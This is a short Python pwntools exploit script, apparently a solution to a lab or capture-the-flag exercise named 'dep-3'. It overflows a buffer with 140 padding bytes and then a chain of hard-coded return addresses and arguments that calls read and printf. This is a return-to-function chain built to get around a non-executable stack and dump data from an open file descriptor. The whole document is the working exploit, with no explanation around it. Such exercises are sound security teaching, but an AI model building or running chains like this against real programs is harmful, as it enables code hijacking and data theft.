#!/usr/bin/env python

from pwn import *
import re

p = process("./dep-3")

# create & send buffer
somefunc_addr = 0x08048894
buff_addr = 0xffffc450
printf_addr = 0x804ede0
read_addr = 0x806d2a0

fd = 3
size = 100

buffer = "A"*140 + p32(somefunc_addr) + p32(read_addr) + p32(printf_addr) + p32(fd) + p32(buff_addr) + p32(size)
p.sendline(buffer)
p.interactive()
